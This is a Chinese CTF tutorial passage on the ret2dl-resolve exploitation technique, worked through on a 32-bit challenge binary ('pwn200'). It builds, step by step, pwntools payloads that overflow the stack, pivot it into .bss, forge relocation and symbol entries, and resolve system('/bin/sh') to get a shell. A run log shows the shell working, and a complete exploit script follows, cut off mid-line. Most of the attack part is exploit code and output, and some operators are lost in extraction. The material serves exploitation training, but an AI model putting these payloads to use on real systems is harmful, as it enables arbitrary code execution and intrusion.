\u5730\u5740\u8db3\u591f\u5927\u7684\u504f\u79fb\u4f7f\u5176\u80fd\u591f\u8fbe\u5230\u8fd9\u4e2a\u7b26\u53f7\u4e4b\u540e\u7684\u4e00\u6bb5\u5185\u5b58\uff0c\u800c\u90a3\u6bb5\u5185\u5b58\u91cc\u4fdd\u5b58\u7740\u8fd9\u4e2a\u5c06\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u540d\u79f0\u3002\n\n\n\n\n\u8fd8\u8bb0\u5f97\u6211\u4eec\u524d\u9762\u8bf4\u8fc7\u7684 GOT[1]\uff0c\u5b83\u662f\u4e00\u4e2a link_map \u7c7b\u578b\u7684\u6307\u9488\uff0c\u5176 \nl_info\n \u57df\u4e2d\u6709\u4e00\u4e2a\u5305\u542b \n.dynmic\n \u6bb5\u4e2d\u6240\u6709\u6761\u76ee\u6784\u6210\u7684\u6570\u7ec4\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u662f\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u5b9a\u4f4d\u7b26\u53f7\u89e3\u6790\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u5bf9\u8c61\u7684\u3002\u901a\u8fc7\u8986\u76d6\u8fd9\u4e2a link_map \u7684\u4e00\u90e8\u5206\uff0c\u5c31\u80fd\u591f\u5c06 \nl_info\n \u57df\u4e2d\u7684 \nDT_STRTAB\n \u6761\u76ee\u6307\u5411\u4e00\u4e2a\u7279\u610f\u5236\u9020\u7684\u52a8\u6001\u6761\u76ee\uff0c\u90a3\u91cc\u5219\u6307\u5411\u4e00\u4e2a\u5047\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u3002\n\n\n\n\npwn200\n\n\n\u83b7\u5f97\u4e86 re2dl-resolve \u6240\u9700\u7684\u6240\u6709\u77e5\u8bc6\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u5206\u6790\u9898\u76ee\u3002\n\n\n\u9996\u5148\u89e6\u53d1\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u504f\u79fb\u4e3a 112\uff1a\n\ngdb-peda$ pattern_offset 0x41384141\n1094205761 found at offset: 112\n\n\n\n\u6839\u636e\u7406\u8bba\u77e5\u8bc6\u53ca\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5206\u6790\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a read \u51fd\u6570\u7528\u4e8e\u8bfb\u5165\u540e\u7eed\u7684 payload \u548c\u4f2a\u9020\u7684\u5404\u79cd\u8868\uff0c\u4e00\u4e2a write \u51fd\u6570\u7528\u4e8e\u9a8c\u8bc1\u6bcf\u4e00\u6b65\u7684\u6b63\u786e\u6027\uff0c\u6700\u540e\u5c06 write \u6362\u6210 system\uff0c\u5c31\u80fd\u5f97\u5230 shell \u4e86\u3002\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n# context.log_level = \ndebug\n\n\n\nelf\n \n=\n \nELF\n(\n./a.out\n)\n\n\nio\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\nio\n.\nrecv\n()\n\n\n\npppr_addr\n      \n=\n \n0x08048699\n     \n# pop esi ; pop edi ; pop ebp ; ret\n\n\npop_ebp_addr\n   \n=\n \n0x0804869b\n     \n# pop ebp ; ret\n\n\nleave_ret_addr\n \n=\n \n0x080484b6\n     \n# leave ; ret\n\n\n\nwrite_plt\n \n=\n \nelf\n.\nplt\n[\nwrite\n]\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nread_plt\n  \n=\n \nelf\n.\nplt\n[\nread\n]\n\n\n\nplt_0\n    \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n        \n# 0x80483e0\n\n\nrel_plt\n  \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n    \n# 0x8048390\n\n\ndynsym\n   \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n     \n# 0x80481cc\n\n\ndynstr\n   \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n     \n# 0x804828c\n\n\nbss_addr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.bss\n)\n.\nheader\n.\nsh_addr\n        \n# 0x804a028\n\n\n\nbase_addr\n \n=\n \nbss_addr\n \n+\n \n0x600\n    \n# 0x804a628\n\n\n\n\u5206\u522b\u83b7\u53d6\u4f2a\u9020\u5404\u79cd\u8868\u6240\u9700\u8981\u7684\u6bb5\u5730\u5740\uff0c\u5c06 bss \u6bb5\u7684\u5730\u5740\u52a0\u4e0a 0x600 \u4f5c\u4e3a\u4f2a\u9020\u6570\u636e\u7684\u57fa\u5730\u5740\uff0c\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u7a0d\u52a0\u4fee\u6539\u3002gadget pppr \u7528\u4e8e\u5e73\u8861\u6808\uff0c pop ebp \u548c leave ret \u914d\u5408\uff0c\u4ee5\u8fbe\u5230\u5c06 esp \u6307\u5411 base_addr \u7684\u76ee\u7684\uff08\u5728\u7ae0\u82823.3.4\u4e2d\u6709\u8bb2\u5230\uff09\u3002\n\n\n\u7b2c\u4e00\u90e8\u5206\u7684 payload \u5982\u4e0b\u6240\u793a\uff0c\u9996\u5148\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6 100 \u5b57\u8282\u5230 base_addr\uff0c\u5c06 esp \u6307\u5411\u5b83\uff0c\u5e76\u8df3\u8f6c\u8fc7\u53bb\uff0c\u6267\u884c base_addr \u5904\u7684 payload\uff1a\n\npayload_1\n  \n=\n \nA\n \n*\n \n112\n\n\npayload_1\n \n+=\n \np32\n(\nread_plt\n)\n\n\npayload_1\n \n+=\n \np32\n(\npppr_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\n0\n)\n\n\npayload_1\n \n+=\n \np32\n(\nbase_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\n100\n)\n\n\npayload_1\n \n+=\n \np32\n(\npop_ebp_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\nbase_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\nleave_ret_addr\n)\n\n\n\nio\n.\nsend\n(\npayload_1\n)\n\n\n\n\n\u4ece\u8fd9\u91cc\u5f00\u59cb\uff0c\u540e\u9762\u7684 paylaod \u90fd\u662f\u901a\u8fc7 read \u51fd\u6570\u8bfb\u5165\u7684\uff0c\u6240\u4ee5\u5fc5\u987b\u4e3a 100 \u5b57\u8282\u957f\u3002\u9996\u5148\uff0c\u8c03\u7528 write@plt \u51fd\u6570\u6253\u5370\u51fa\u4e0e base_addr \u504f\u79fb 80 \u5b57\u8282\u5904\u7684\u5b57\u7b26\u4e32 \"/bin/sh\"\uff0c\u4ee5\u9a8c\u8bc1\u6808\u8f6c\u79fb\u6210\u529f\u3002\u6ce8\u610f\u7531\u4e8e \n.dynstr\n \u4e2d\u7684\u5b57\u7b26\u4e32\u90fd\u662f\u4ee5 \"\\x00\" \u7ed3\u5c3e\u7684\uff0c\u6240\u4ee5\u4f2a\u9020\u5b57\u7b26\u4e32\u4e3a \"bin/sh\\x00\"\u3002\n\npayload_2\n  \n=\n \nAAAA\n     \n# new ebp\n\n\npayload_2\n \n+=\n \np32\n(\nwrite_plt\n)\n\n\npayload_2\n \n+=\n \nAAAA\n\n\npayload_2\n \n+=\n \np32\n(\n1\n)\n\n\npayload_2\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_2\n \n+=\n \np32\n(\nlen\n(\n/bin/sh\n))\n\n\npayload_2\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_2\n))\n\n\npayload_2\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_2\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_2\n))\n\n\n\nio\n.\nsendline\n(\npayload_2\n)\n\n\nprint\n \nio\n.\nrecv\n()\n\n\n\n\n\u6211\u4eec\u77e5\u9053\u7b2c\u4e00\u6b21\u8c03\u7528 write@plt \u65f6\u5176\u5b9e\u662f\u5148\u5c06 reloc_index \u538b\u5165\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230 PLT[0]\uff1a\n\ngdb-peda$ disassemble write\nDump of assembler code for function write@plt:\n   0x08048430 \n+0\n:     jmp    DWORD PTR ds:0x804a01c\n   0x08048436 \n+6\n:     push   0x20\n   0x0804843b \n+11\n:    jmp    0x80483e0\nEnd of assembler dump.\n\n\n\u8fd9\u6b21\u6211\u4eec\u8df3\u8fc7\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u76f4\u63a5\u63a7\u5236 \neip\n \u8df3\u8f6c\u5230 PLT[0]\uff0c\u5e76\u5728\u6808\u4e0a\u5e03\u7f6e\u4e0a reloc_index\uff0c\u5373 \n0x20\n\uff0c\u5c31\u50cf\u662f\u8c03\u7528\u4e86 write@plt \u4e00\u6837\u3002\n\nreloc_index\n \n=\n \n0x20\n\n\n\npayload_3\n  \n=\n \nAAAA\n\n\npayload_3\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_3\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_3\n \n+=\n \nAAAA\n\n\npayload_3\n \n+=\n \np32\n(\n1\n)\n\n\npayload_3\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_3\n \n+=\n \np32\n(\nlen\n(\n/bin/sh\n))\n\n\npayload_3\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_3\n))\n\n\npayload_3\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_3\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_3\n))\n\n\n\nio\n.\nsendline\n(\npayload_3\n)\n\n\nprint\n \nio\n.\nrecv\n()\n\n\n\n\n\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u66f4\u8fdb\u4e00\u6b65\uff0c\u4f2a\u9020\u4e00\u4e2a write \u51fd\u6570\u7684 Elf32_Rel \u7ed3\u6784\u4f53\uff0c\u539f\u7ed3\u6784\u4f53\u5728 \n.rel.plt\n \u4e2d\uff0c\u5982\u4e0b\u6240\u793a\uff1a\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Addr\n    \nr_offset\n;\n       \n/* Address */\n\n  \nElf32_Word\n    \nr_info\n;\n         \n/* Relocation type and symbol index */\n\n\n}\n \nElf32_Rel\n;\n\n\n\n\n$ readelf -r a.out | grep write\n0804a01c  00000707 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0\n\n\n\u8be5\u7ed3\u6784\u4f53\u7684 \nr_offset\n \u662f write@got \u5730\u5740\uff0c\u5373 \n0x0804a01c\n\uff0c\nr_info\n \u662f \n0x707\n\u3002\u52a8\u6001\u88c5\u8f7d\u5668\u901a\u8fc7 reloc_index \u627e\u5230\u5b83\uff0c\u800c reloc_index \u662f\u76f8\u5bf9\u4e8e \n.rel.plt\n \u7684\u504f\u79fb\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u63a7\u5236\u4e86\u8fd9\u4e2a\u504f\u79fb\uff0c\u5c31\u53ef\u4ee5\u8df3\u8f6c\u5230\u4f2a\u9020\u7684 write \u4e0a\u3002payload \u5982\u4e0b\uff1a\n\nreloc_index\n \n=\n \nbase_addr\n \n+\n \n28\n \n-\n \nrel_plt\n  \n# fake_reloc = base_addr + 28\n\n\n\nr_info\n \n=\n \n0x707\n\n\nfake_reloc\n \n=\n \np32\n(\nwrite_got\n)\n \n+\n \np32\n(\nr_info\n)\n\n\n\npayload_4\n  \n=\n \nAAAA\n\n\npayload_4\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_4\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_4\n \n+=\n \nAAAA\n\n\npayload_4\n \n+=\n \np32\n(\n1\n)\n\n\npayload_4\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_4\n \n+=\n \np32\n(\nlen\n(\n/bin/sh\n))\n\n\npayload_4\n \n+=\n \nfake_reloc\n\n\npayload_4\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_4\n))\n\n\npayload_4\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_4\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_4\n))\n\n\n\nio\n.\nsendline\n(\npayload_4\n)\n\n\nprint\n \nio\n.\nrecv\n()\n\n\n\n\u53e6\u5916\u8bb2\u4e00\u8bb2 Elf32_Rel \u503c\u7684\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b\uff0c\u6211\u4eec\u4e0b\u9762\u4f1a\u5f97\u7528\u5230\uff1a\n\n#define ELF32_R_SYM(val)        ((val) \n 8)\n\n\n#define ELF32_R_TYPE(val)       ((val) \n 0xff)\n\n\n#define ELF32_R_INFO(sym, type)     (((sym) \n 8) + ((type) \n 0xff))\n\n\n\n- \nELF32_R_SYM(0x707) = (0x707 \n 8) = 0x7\n\uff0c\u5373 \n.dynsym\n \u7684\u7b2c 7 \u884c\n- \nELF32_R_TYPE(0x707) = (0x707 \n 0xff) = 0x7\n\uff0c\u5373 \n#define R_386_JMP_SLOT 7 /* Create PLT entry */\n\n- \nELF32_R_INFO(0x7, 0x7) = (((0x7 \n 8) + ((0x7) \n 0xff)) = 0x707\n\uff0c\u5373 r_info\n\n\n\u8fd9\u4e00\u6b21\uff0c\u4f2a\u9020\u4f4d\u4e8e \n.dynsym\n \u6bb5\u7684\u7ed3\u6784\u4f53 Elf32_Sym\uff0c\u539f\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a\n\ntypedef\n \nstruct\n\n\n{\n\n  \nElf32_Word\n    \nst_name\n;\n        \n/* Symbol name (string tbl index) */\n\n  \nElf32_Addr\n    \nst_value\n;\n       \n/* Symbol value */\n\n  \nElf32_Word\n    \nst_size\n;\n        \n/* Symbol size */\n\n  \nunsigned\n \nchar\n \nst_info\n;\n        \n/* Symbol type and binding */\n\n  \nunsigned\n \nchar\n \nst_other\n;\n       \n/* Symbol visibility */\n\n  \nElf32_Section\n \nst_shndx\n;\n       \n/* Section index */\n\n\n}\n \nElf32_Sym\n;\n\n\n\n\n$ readelf -s a.out | grep write\n     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)\n\n\n\u8f6c\u50a8 \n.dynsym\n \u6bb5\u5e76\u627e\u5230\u7b2c 7 \u884c\uff1a\n\n$ objdump -s -j .dynsym a.out\n...\n 804823c 4c000000 00000000 00000000 12000000  L...............\n...\n\n\n\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f \nst_name\n \u548c \nst_info\n\uff0c\u5206\u522b\u4e3a \n0x4c\n \u548c \n0x12\n\u3002\u6784\u9020 payload \u5982\u4e0b\uff1a\n\nreloc_index\n \n=\n \nbase_addr\n \n+\n \n28\n \n-\n \nrel_plt\n\n\nfake_sym_addr\n \n=\n \nbase_addr\n \n+\n \n36\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n)\n \n# since the size of Elf32_Sym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\n\nr_sym\n \n=\n \n(\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calcute the symbol index since the size of Elf32_Sym\n\n\nr_type\n \n=\n \n0x7\n    \n# R_386_JMP_SLOT -\n Create PLT entry\n\n\nr_info\n \n=\n \n(\nr_sym\n \n \n8\n)\n \n+\n \n(\nr_type\n \n \n0xff\n)\n \n# ELF32_R_INFO(sym, type) = (((sym) \n 8) + ((type) \n 0xff))\n\n\nfake_reloc\n \n=\n \np32\n(\nwrite_got\n)\n \n+\n \np32\n(\nr_info\n)\n\n\n\nst_name\n \n=\n \n0x4c\n\n\nst_info\n \n=\n \n0x12\n\n\nfake_sym\n \n=\n \np32\n(\nst_name\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\nst_info\n)\n\n\n\npayload_5\n  \n=\n \nAAAA\n\n\npayload_5\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_5\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_5\n \n+=\n \nAAAA\n\n\npayload_5\n \n+=\n \np32\n(\n1\n)\n\n\npayload_5\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_5\n \n+=\n \np32\n(\nlen\n(\n/bin/sh\n))\n\n\npayload_5\n \n+=\n \nfake_reloc\n\n\npayload_5\n \n+=\n \nA\n \n*\n \nalign\n\n\npayload_5\n \n+=\n \nfake_sym\n\n\npayload_5\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_5\n))\n\n\npayload_5\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_5\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_5\n))\n\n\n\nio\n.\nsendline\n(\npayload_5\n)\n\n\nprint\n \nio\n.\nrecv\n()\n\n\n\n\u4e00\u6837\u5730\u8bb2\u4e00\u4e0b st_info \u7684\u89e3\u6790\u548c\u63d2\u5165\u7b97\u6cd5\uff1a\n\n#define ELF32_ST_BIND(val)      (((unsigned char) (val)) \n 4)\n\n\n#define ELF32_ST_TYPE(val)      ((val) \n 0xf)\n\n\n#define ELF32_ST_INFO(bind, type)   (((bind) \n 4) + ((type) \n 0xf))\n\n\n\n- \nELF32_ST_BIND(0x12) = (((unsigned char) (0x12)) \n 4) = 0x1\n\uff0c\u5373 \n#define STB_GLOBAL 1 /* Global symbol */\n\n- \nELF32_ST_TYPE(0x12) = ((0x12) \n 0xf) = 0x2\n\uff0c\u5373 \n#define STT_FUNC 2 /* Symbol is a code object */\n\n- \nELF32_ST_INFO(0x1, 0x2) = (((0x1) \n 4) + ((0x2) \n 0xf)) = 0x12\n\uff0c\u5373 st_info\n\n\n\u4e0b\u4e00\u6b65\uff0c\u662f\u5c06 \nst_name\n \u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684\u5b57\u7b26\u4e32 \"write\"\uff0cpayload \u5982\u4e0b\uff1a\n\nreloc_index\n \n=\n \nbase_addr\n \n+\n \n28\n \n-\n \nrel_plt\n\n\nfake_sym_addr\n \n=\n \nbase_addr\n \n+\n \n36\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n)\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\n\nr_sym\n \n=\n \n(\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n\n\nr_type\n \n=\n \n0x7\n\n\nr_info\n \n=\n \n(\nr_sym\n \n \n8\n)\n \n+\n \n(\nr_type\n \n \n0xff\n)\n\n\nfake_reloc\n \n=\n \np32\n(\nwrite_got\n)\n \n+\n \np32\n(\nr_info\n)\n\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n     \n# address of string \nwrite\n\n\nst_bind\n \n=\n \n0x1\n   \n# STB_GLOBAL -\n Global symbol\n\n\nst_type\n \n=\n \n0x2\n   \n# STT_FUNC -\n Symbol is a code object\n\n\nst_info\n \n=\n \n(\nst_bind\n \n \n4\n)\n \n+\n \n(\nst_type\n \n \n0xf\n)\n  \n# 0x12\n\n\nfake_sym\n \n=\n \np32\n(\nst_name\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\nst_info\n)\n\n\n\npayload_6\n \n=\n \nAAAA\n\n\npayload_6\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_6\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_6\n \n+=\n \nAAAA\n\n\npayload_6\n \n+=\n \np32\n(\n1\n)\n\n\npayload_6\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_6\n \n+=\n \np32\n(\nlen\n(\n/bin/sh\n))\n\n\npayload_6\n \n+=\n \nfake_reloc\n\n\npayload_6\n \n+=\n \nA\n \n*\n \nalign\n\n\npayload_6\n \n+=\n \nfake_sym\n\n\npayload_6\n \n+=\n \nwrite\n\\x00\n\n\npayload_6\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_6\n))\n\n\npayload_6\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_6\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_6\n))\n\n\n\nio\n.\nsendline\n(\npayload_6\n)\n\n\nprint\n \nio\n.\nrecv\n()\n\n\n\n\n\u6700\u540e\uff0c\u53ea\u8981\u5c06 \"write\" \u66ff\u6362\u6210\u4efb\u4f55\u6211\u4eec\u5e0c\u671b\u7684\u51fd\u6570\uff0c\u5e76\u8c03\u6574\u53c2\u6570\uff0c\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u6362\u6210 \"system\"\uff0c\u62ff\u5230 shell\uff1a\n\nreloc_index\n \n=\n \nbase_addr\n \n+\n \n28\n \n-\n \nrel_plt\n\n\nfake_sym_addr\n \n=\n \nbase_addr\n \n+\n \n36\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n)\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\n\nr_sym\n \n=\n \n(\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n\n\nr_type\n \n=\n \n0x7\n\n\nr_info\n \n=\n \n(\nr_sym\n \n \n8\n)\n \n+\n \n(\nr_type\n \n \n0xff\n)\n\n\nfake_reloc\n \n=\n \np32\n(\nwrite_got\n)\n \n+\n \np32\n(\nr_info\n)\n\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nst_bind\n \n=\n \n0x1\n\n\nst_type\n \n=\n \n0x2\n\n\nst_info\n \n=\n \n(\nst_bind\n \n \n4\n)\n \n+\n \n(\nst_type\n \n \n0xf\n)\n\n\nfake_sym\n \n=\n \np32\n(\nst_name\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\n0\n)\n \n+\n \np32\n(\nst_info\n)\n\n\n\npayload_7\n \n=\n \nAAAA\n\n\npayload_7\n \n+=\n \np32\n(\nplt_0\n)\n\n\npayload_7\n \n+=\n \np32\n(\nreloc_index\n)\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \np32\n(\nbase_addr\n \n+\n \n80\n)\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \nAAAA\n\n\npayload_7\n \n+=\n \nfake_reloc\n\n\npayload_7\n \n+=\n \nA\n \n*\n \nalign\n\n\npayload_7\n \n+=\n \nfake_sym\n\n\npayload_7\n \n+=\n \nsystem\n\\x00\n\n\npayload_7\n \n+=\n \nA\n \n*\n \n(\n80\n \n-\n \nlen\n(\npayload_7\n))\n\n\npayload_7\n \n+=\n \n/bin/sh\n\\x00\n\n\npayload_7\n \n+=\n \nA\n \n*\n \n(\n100\n \n-\n \nlen\n(\npayload_7\n))\n\n\n\nio\n.\nsendline\n(\npayload_7\n)\n\n\nio\n.\ninteractive\n()\n\n\n\n\nBingo!!!\n\n$ python2 exp.py\n[*] \n/home/firmy/Desktop/a.out\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\n\u8fd9\u9898\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u5728 64 \u4f4d\u4e0b\u4f1a\u6709\u4e00\u4e9b\u53d8\u5316\uff0c\u6bd4\u5982\u8bf4\uff1a\n- 64 \u4f4d\u7a0b\u5e8f\u4e00\u822c\u60c5\u51b5\u4e0b\u4f7f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u4f46\u7ed9 \n_dl_runtime_resolve\n \u4f20\u53c2\u65f6\u4f7f\u7528\u6808\n- \n_dl_runtime_resolve\n \u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 \nreloc_index\n \u7531\u504f\u79fb\u53d8\u4e3a\u4e86\u7d22\u5f15\u3002\n- \n_dl_fixup\n \u51fd\u6570\u4e2d\uff0c\u5728\u4f2a\u9020 fake_sym \u540e\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5d29\u6e83\uff0c\u9700\u8981\u5c06 \nlink_map+0x1c8\n \u5730\u5740\u4e0a\u7684\u503c\u7f6e\u96f6\n\n\n\u5177\u4f53\u7684\u4ee5\u540e\u9047\u5230\u518d\u8bf4\u3002\n\n\n\u5982\u679c\u89c9\u5f97\u624b\u5de5\u6784\u9020\u592a\u9ebb\u70e6\uff0c\u6709\u4e00\u4e2a\u5de5\u5177 \nroputils\n \u53ef\u4ee5\u7b80\u5316\u6b64\u8fc7\u7a0b\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u81ea\u884c\u5c1d\u8bd5\u3002\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n# context.log_level = \ndebug\n\n\n\nelf\n \n=\n \nELF\n(\n./a.out\n)\n\n\nio\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\nio\n.\nrecv\n()\n\n\n\npppr_addr\n      \n=\n \n0x08048699\n     \n# pop esi ; pop edi ; pop ebp ; ret\n\n\npop_ebp_addr\n   \n=\n \n0x0804869b\n     \n# pop ebp ; ret\n\n\nleave_ret_addr\n \n=\n \n0x080484b6\n     \n# leave ; ret\n\n\n\nwrite_plt\n \n=\n \nelf\n.\nplt\n[\nwrite\n]\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nread_plt\n  \n=\n \nelf\n.\nplt\n[\nread\n]\n\n\n\nplt_0\n    \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n        \n# 0x80483e0\n\n\nrel_plt\n  \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n    \n# 0x8048390\n\n\ndynsym\n   \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n     \n# 0x80481cc\n\n\ndynstr\n   \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n     \n# 0x804828c\n\n\nbss_addr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.bss\n)\n.\nheader\n.\nsh_addr\n        \n# 0x804a028\n\n\n\nbase_addr\n \n=\n \nbss_addr\n \n+\n \n0x600\n    \n# 0x804a628\n\n\n\npayload_1\n  \n=\n \nA\n \n*\n \n112\n\n\npayload_1\n \n+=\n \np32\n(\nread_plt\n)\n\n\npayload_1\n \n+=\n \np32\n(\npppr_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\n0\n)\n\n\npayload_1\n \n+=\n \np32\n(\nbase_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\n100\n)\n\n\npayload_1\n \n+=\n \np32\n(\npop_ebp_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\nbase_addr\n)\n\n\npayload_1\n \n+=\n \np32\n(\nleave_ret_addr\n)\n\n\nio\n.\nsend\n(\npayload_1\n)\n\n\n\n# payload_2  = \nAAAA\n     # new ebp\n\n\n# payload_2 += p32(write_plt)\n\n\n# payload_2 += \nAAAA\n\n\n# payload_2 += p32(1)\n\n\n# payload_2 += p32(base_addr + 80)\n\n\n# payload_2 += p32(len(\n/bin/sh\n))\n\n\n# payload_2 += \nA\n * (80 - len(payload_2))\n\n\n# payload_2 += \n/bin/sh\\x00\n\n\n# payload_2 += \nA\n * (100 - len(payload_2))\n\n\n# io.sendline(payload_2)\n\n\n# print io.recv()\n\n\n\n# reloc_index = 0x20\n\n\n# payload_3  = \nAAAA\n\n\n# payload_3 += p32(plt_0)\n\n\n# payload_3 += p32(reloc_index)\n\n\n# payload_3 += \nAAAA\n\n\n# payload_3 += p32(1)\n\n\n# payload_3 += p32(base_addr + 80)\n\n\n# payload_3 += p32(len(\n/bin/sh\n))\n\n\n# payload_3 += \nA\n * (80 - len(payload_3))\n\n\n# payload_3 += \n/bin/sh\\x00\n\n\n# payload_3 += \nA\n * (100 - len(payload_3))\n\n\n# io.sendline(payload_3)\n\n\n# print io.recv()\n\n\n\n# reloc_index = base_addr + 28 - rel_plt  # fake_reloc = base_addr + 28\n\n\n# r_info = 0x707\n\n\n# fake_reloc = p32(write_got) + p32(r_info)\n\n\n# payload_4  = \nAAAA\n\n\n# payload_4 += p32(plt_0)\n\n\n# payload_4 += p32(reloc_index)\n\n\n# payload_4 += \nAAAA\n\n\n# payload_4 += p32(1)\n\n\n# payload_4 += p32(base_addr + 80)\n\n\n# payload_4 += p32(len(\n/bin/sh\n))\n\n\n# payload_4 += fake_reloc\n\n\n# payload_4 += \nA\n * (80 - len(payload_4))\n\n\n# payload_4 += 